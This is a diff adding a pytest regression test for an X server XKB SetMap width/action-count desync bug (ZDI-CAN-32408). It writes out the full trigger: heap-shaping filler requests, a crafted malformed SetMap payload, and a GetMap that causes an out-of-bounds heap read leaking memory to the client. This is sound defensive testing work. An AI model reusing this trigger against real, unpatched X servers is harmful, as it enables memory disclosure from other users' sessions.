@@ -928,3 +928,164 @@ class TestXkbSetMapMapWidths:
         assert xserver.is_alive, (
             "Server crashed - mapWidths stack OOB write (ZDI-CAN-30161)"
         )
+
+
+class TestXkbSetMapDesync:
+    """Tests for XKB SetMap key-width/action-count desync vulnerabilities."""
+
+    @pytest.mark.asan
+    def test_setmap_width_action_count_desync(self, xserver, xkb_xclient):
+        """
+        ZDI-CAN-32408: XKB SetMap key-width/action-count desync OOB read.
+
+        CheckKeySyms populates symsPerKey[] with new widths for keys in the
+        request range, then continues for keys beyond the range starting
+        at index i = nKeySyms (not firstKeySym + nKeySyms). When firstKeySym
+        is large and nKeySyms is 1, the second loop overwrites
+        symsPerKey[target] with the old width from the existing map.
+
+        CheckKeyActions then validates the wire action count against the
+        stale old width and accepts it. In _XkbSetMap, SetKeySyms widens
+        the key (resizing actions to nGroups * newWidth), but SetKeyActions
+        then resizes again to the old count. A subsequent XkbGetMap reads
+        XkbKeyNumActions (derived from the new width) entries from the
+        shorter allocation, causing an OOB heap read. The leaked bytes
+        are sent back to the client in the GetMap reply.
+        """
+        xclient, opcode = xkb_xclient
+
+        # Step 1: Get current keymap
+        reply = xclient.xkb_get_map(
+            opcode,
+            full=xkb.XkbKeyTypesMask | xkb.XkbKeySymsMask,
+        )
+        assert reply is not None, "Initial GetMap failed"
+
+        min_key = reply.min_key_code
+        max_key = reply.max_key_code
+        n_types = reply.total_types
+        first_key_sym = reply.first_key_sym
+
+        # Find a target key near max_key_code that has nonzero syms.
+        # We pick a key with small n_syms so the desync between old
+        # and new width is large.
+        target_key = None
+        target_sym = None
+        for i in range(len(reply.sym_maps) - 1, -1, -1):
+            sm = reply.sym_maps[i]
+            if sm.n_syms > 0 and sm.n_syms < 63:
+                target_key = first_key_sym + i
+                target_sym = sm
+                break
+        if target_key is None or target_sym is None:
+            pytest.skip("Could not find a suitable target key")
+
+        old_n_syms = target_sym.n_syms
+
+        # Step 2: Fill action slots on earlier keys so our target's
+        # action allocation is tightly bounded by the heap.
+        fillers = []
+        for i, sm in enumerate(reply.sym_maps):
+            kc = first_key_sym + i
+            if kc >= target_key:
+                break
+            if sm.n_syms > 0:
+                fillers.append((kc, sm.n_syms))
+        fillers = fillers[:96]
+
+        if fillers:
+            first_filler = fillers[0][0]
+            last_filler = fillers[-1][0]
+            filler_range = last_filler - first_filler + 1
+            filler_by_key = {kc: ns for kc, ns in fillers}
+            counts = bytearray()
+            total_filler_acts = 0
+            for kc in range(first_filler, last_filler + 1):
+                ns = filler_by_key.get(kc, 0)
+                counts.append(ns)
+                total_filler_acts += ns
+            filler_payload = bytes(counts) + b"\x00" * ((4 - len(counts) % 4) % 4)
+            filler_payload += b"\x00" * (total_filler_acts * 8)
+
+            filler_req = xkb.SetMapRequest(
+                opcode=opcode,
+                present=xkb.XkbKeyActionsMask,
+                min_key_code=min_key,
+                max_key_code=max_key,
+                first_key_act=first_filler,
+                n_key_acts=filler_range,
+                total_acts=total_filler_acts,
+                payload=filler_payload,
+            )
+            xclient.send_request(filler_req.to_bytes())
+            time.sleep(0.05)
+
+        # Step 3: Send the vulnerable SetMap that widens the target key
+        # to 63 levels while providing old_n_syms actions.
+        # The desync: CheckKeySyms writes the new width to symsPerKey[target],
+        # but its second loop (starting at i=nKeySyms=1, not firstKeySym+1)
+        # overwrites symsPerKey[target] with the old width from the existing
+        # map. CheckKeyActions then accepts old_n_syms as valid.
+        wide_levels = 63
+        new_type_idx = n_types
+
+        # New key type: 63 levels, no map entries, no preserve
+        type_wire = struct.pack("<BBHBBBB", 0, 0, 0, wide_levels, 0, 0, 0)
+
+        # Sym map for the target key using the new wide type
+        sym_wire = struct.pack(
+            "<BBBBBBH",
+            new_type_idx,  # kt_index[0]
+            0,  # kt_index[1]
+            0,  # kt_index[2]
+            0,  # kt_index[3]
+            1,  # groupInfo (1 group)
+            wide_levels,  # width
+            wide_levels,  # nSyms
+        )
+        # Keysym data
+        sym_wire += b"\x00\x00\x00\x00" * wide_levels
+
+        # Action count: use the old width (this is the desync)
+        action_counts = bytes([old_n_syms]) + b"\x00" * 3  # padded to 4
+        action_data = b"\x00" * (old_n_syms * 8)
+
+        payload = type_wire + sym_wire + action_counts + action_data
+
+        vuln_req = xkb.SetMapRequest(
+            opcode=opcode,
+            present=xkb.XkbKeyTypesMask | xkb.XkbKeySymsMask | xkb.XkbKeyActionsMask,
+            flags=xkb.XkbSetMapResizeTypes,
+            min_key_code=min_key,
+            max_key_code=max_key,
+            first_type=new_type_idx,
+            n_types=1,
+            first_key_sym=target_key,
+            n_key_syms=1,
+            total_syms=wide_levels,
+            first_key_act=target_key,
+            n_key_acts=1,
+            total_acts=old_n_syms,
+            payload=payload,
+        )
+        xclient.send_request(vuln_req.to_bytes())
+        time.sleep(0.1)
+
+        assert xserver.is_alive, "Server crashed during SetMap - unexpected"
+
+        # Step 4: Trigger the OOB read via GetMap for the target key's actions
+        get_req = xkb.GetMapRequest(
+            opcode=opcode,
+            partial=xkb.XkbKeyActionsMask,
+            first_key_act=target_key,
+            n_key_acts=1,
+        )
+        xclient.send_request(get_req.to_bytes())
+        time.sleep(0.5)
+
+        assert xserver.is_alive, (
+            "Server crashed - XKB SetMap width/action desync caused OOB read "
+            "in XkbWriteKeyActions when XkbKeyNumActions derived action count "
+            "from widened key_sym_map.width but the action array was sized to "
+            "the old count (ZDI-CAN-32408)"
+        )
